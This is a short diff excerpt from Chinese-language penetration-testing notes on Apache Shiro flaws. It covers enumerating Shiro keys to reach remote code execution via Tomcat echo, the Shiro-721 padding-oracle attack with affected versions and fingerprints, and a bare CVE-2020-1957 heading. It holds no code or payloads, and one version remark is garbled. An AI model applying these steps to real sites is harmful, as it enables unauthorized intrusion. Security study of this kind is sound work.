+    2.  利⽤上⼀步获得的 Shiro Key，尝试 Tomcat 回显，如果成功再报出⼀个远程代码执⾏的漏洞
+- 由于第⼀步的检测依靠的是 Shiro 本身的代码逻辑，可以完全不受环境的影响，只要 ⽬标使⽤的秘钥在我们待枚举的列表⾥，那么就⾄少可以把 Key 枚举出来，这就很⼤ 的提⾼了漏洞检测的下限。
+- 另外有个⼩插曲是，有的⽹站没法根据是否存在 deleteMe 来判断，⽽是需要根据 deleteMe 的数量来判断，举个例⼦，如果秘钥错误，返回的是两个 deleteMe ，反之返回的是⼀个 deleteMe 。这
+
+##### Shiro-721(CVE-2019-12422)
+
+- **影响版本**：1.2.5 <= Apache Shiro < 1.4.2
+- 攻击要求：
+
+  - （需要一个合法的登录账号，基于Padding Oracle attack来实现的攻击）
+  - 这玩意要一直爆破，对网站大概要爆破几个小时，没啥实际用途。
+- 漏洞指纹
+
+  1.set-Cookie: rememberMe=deleteMe
+  2.URL中有shiro字样
+  3.有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可
+
+- 在1.2.4版本后，shiro已经更换 AES-CBC AES-CBC 为 AES-GCM AES-GCM ，无法再通过Padding Oracle遍历key。
+
+##### 权限绕过漏洞（CVE-2020-1957）
 
 ## RMI
 
